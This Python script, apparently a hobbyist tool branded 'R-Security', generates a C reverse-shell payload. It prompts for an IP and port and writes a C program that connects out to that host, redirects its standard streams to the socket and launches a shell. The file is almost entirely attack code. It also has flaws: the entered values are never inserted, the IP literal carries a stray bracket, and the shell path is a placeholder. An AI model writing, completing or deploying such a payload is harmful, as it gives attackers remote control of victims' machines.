import time
import sys
import pyautogui
import subprocess

# Loading()
def processing():
	animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
	for i in range(len(animation)):
		time.sleep(0.3)
		sys.stdout.write("\r" + animation[ i % len(animation)])
		sys.stdout.flush()

	print("\n")

# C language reverse shell generator code:

def C_rev():
	print("Welcome to R-Security C reverse shell generator")
	print("1 - C language rev shell")
	user = int(input("Please enter a number for rev shell: "))
	if user == 1:
		ip = input("Enter target IP: ")
		port = input("Enter target port: ")
		time.sleep(1)
		processing()
		with open("crevshell.c", "w") as payload:
			payload.write("""
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = ENTER_TARGET_PORT_HERE;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("[ENTER_TARGET_IP_HERE");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"pwsh", NULL};
    execve("{shell}", argv, NULL);

    return 0;       
}
				""")
		print("[*] Reverse shell created successfully!")
		print("[!] Do change the target IP and target PORT fields.")
		print('\033[1m' + "Thank you for using R-Security C reverse shell generator tool" + '\033[0m')
C_rev()